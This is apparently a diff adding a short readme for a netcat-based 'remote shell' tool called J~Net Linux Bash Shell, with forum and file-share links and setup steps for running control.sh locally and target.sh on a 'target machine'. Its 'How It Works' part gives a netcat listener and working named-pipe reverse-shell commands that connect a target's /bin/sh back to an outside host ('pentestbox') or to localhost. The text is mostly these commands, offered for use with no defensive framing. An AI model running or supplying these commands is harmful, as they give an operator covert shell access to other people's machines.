@@ -1,0 +1,80 @@
+J~Net Linux Bash Shell 2018 Edition.
+
+
+
+Forum Link 
+
+jnet.forumotion.com/t381-using-netcat#504
+
+
+(for just Remote Shell)
+
+
+Box Link
+
+https://app.box.com/s/8tmrt1a6pz8ghvojac1uxjyj2t73rhvf
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+
+For Multi Tool 2021
+
+https://jnet.forumotion.com/t1729-jnet-multi-tool-2021#2677
+
+Make sure to install netcat
+
+sudo apt install -y netcat
+
+1. run control script frome your system,
+
+./control.sh
+
+2 open up port you wish to use in firewall and router etc!
+3 open target.sh file on the target machine.
+
+./target.sh
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+How It Works.
+
+As before, we start with a Netcat listener waiting for the inbound shell:
+
+nc -nvlp 443
+
+
+
+or another example
+
+nc -nvlp 1234
+
+
+
+
+Now, on the target machine, I inject the following commands:
+
+
+
+
+mknod /tmp/backpipe p 
+/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe
+
+
+
+example 2:
+
+/bin/sh 0</tmp/backpipe | nc localhost 1234 1>/tmp/backpipe
+
+
+
+
+
+
+
+
